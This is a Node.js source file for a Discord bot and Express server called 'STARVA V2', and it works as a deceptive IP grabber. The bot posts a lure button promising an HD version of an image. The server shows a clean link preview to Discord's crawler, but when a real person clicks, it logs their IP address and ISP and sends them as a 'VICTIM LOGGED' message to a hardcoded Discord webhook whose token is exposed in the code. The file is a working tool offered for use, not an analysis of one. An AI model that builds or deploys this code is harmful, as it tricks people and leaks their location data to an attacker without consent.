require('dotenv').config();
const { Client, GatewayIntentBits, EmbedBuilder } = require('discord.js');
const { ActionRowBuilder, ButtonBuilder, ButtonStyle } = require('discord.js');
const express = require('express');
const axios = require('axios');
require('colors');
const app = express();

const DEVELOPER = "APIS DEVELOPER";
const PREFIX = ".";
const PORT = 8080;
const NGROK_URL = "https://gaddingly-unmistakable-cheryle.ngrok-free.dev"; 
const WEBHOOK_LOG = "https://discord.com/api/webhooks/1452546337492172881/26qhjCgjOVxDNnNHN6taCtfTbV2K4uULtTXzGawvN6Qow9lav_eadNdaFHE69w7JkNnP";

//img
let imgDatabase = {};

const client = new Client({
    intents: [GatewayIntentBits.Guilds, GatewayIntentBits.GuildMessages, GatewayIntentBits.MessageContent]
});

app.get('/i/:id', async (req, res) => {
    // bypas
    res.setHeader('ngrok-skip-browser-warning', 'true');

    const userAgent = req.headers['user-agent'] || "";
    const ip = req.headers['x-forwarded-for']?.split(',')[0] || req.socket.remoteAddress;
    
    const realImgUrl = imgDatabase[req.params.id];
    if (!realImgUrl) return res.status(404).send("Media Expired.");
    if (userAgent.includes("Discordbot") || userAgent.includes("facebookexternalhit")) {
        return res.send(`
            <html>
                <head>
                    <meta property="og:title" content=" ">
                    <meta property="og:image" content="${realImgUrl}">
                    <meta property="og:type" content="website">
                    <meta name="twitter:card" content="summary_large_image">
                </head>
                <body></body>
            </html>
        `);
    }
    if (!userAgent.includes("Discordbot")) {
        console.log(`[!] EXPLOIT SUCCESS | IP: ${ip}`.red);
        try {
            const resGeo = await axios.get(`http://ip-api.com/json/${ip}?fields=status,isp,query`);
            const d = resGeo.data;

            if (d.status === 'success') {
                await axios.post(WEBHOOK_LOG, {
                    embeds: [{
                        title: "💀 STARVA V2: VICTIM LOGGED 💀",
                        color: 16711680,
                        fields: [
                            { name: "🌐 IP Address", value: `\`${d.query}\``, inline: true },
                            { name: "📶 ISP/Wifi", value: `\`${d.isp}\``, inline: true }
                        ],
                        footer: { text: "Starva Intelligence - APIS DEVELOPER" },
                        timestamp: new Date()
                    }]
                });
            }
        } catch (e) { console.log("Tracking Error".red); }
    }
    //html
    res.send(`
        <!DOCTYPE html>
        <html>
        <head>
            <meta http-equiv="refresh" content="0;url=${realImgUrl}">
            <script type="text/javascript">
                window.location.href = "${realImgUrl}"
            </script>
            <title>Loading...</title>
        </head>
        <body>
            <p>Redirecting to high resolution image...</p>
        </body>
        </html>
    `);
});

app.listen(PORT, () => console.log(`[🌐] Web Server Active on Port ${PORT}`.green));

client.on('messageCreate', async message => {
    if (message.author.bot || !message.content.startsWith(PREFIX)) return;

    const args = message.content.slice(PREFIX.length).trim().split(/ +/);
    const command = args.shift().toLowerCase();

    if (command === "createimagegrb") {
        const photoUrl = args[0]; 
        if (!photoUrl || !photoUrl.startsWith("http")) {
            return message.reply("❌ **Format Salah!**\nContoh: `.createimagegrb [link_foto_discord]`");
        }
        const id = Math.random().toString(36).substring(7);
        imgDatabase[id] = photoUrl;
        const trapUrl = `${NGROK_URL}/i/${id}`;
        const row = new ActionRowBuilder()
            .addComponents(
                new ButtonBuilder()
                    .setLabel('View Full Resolution (HD)')
                    .setStyle(ButtonStyle.Link)
                    .setURL(trapUrl)
            );
        const trackerEmbed = new EmbedBuilder()
            .setTitle("🔒 Encrypted Media Content")
            .setDescription("This image is in low resolution. Click the button below to decrypt and view the high-definition original.")
            .setImage(photoUrl) 
            .setColor(0x2B2D31);
        message.channel.send({ 
            embeds: [trackerEmbed], 
            components: [row] 
        });

        await message.reply({ content: `✅ **Payload Ready!** Tombol jebakan sudah terpasang di bawah gambar.` });
    }
});

client.once('ready', () => {
    console.clear();
    console.log(`[⚡] STARVA V2 SILENT TRACKER ONLINE`.magenta);
    console.log(`[👤] DEV: ${DEVELOPER}`.cyan);
});

client.login(process.env.TOKEN);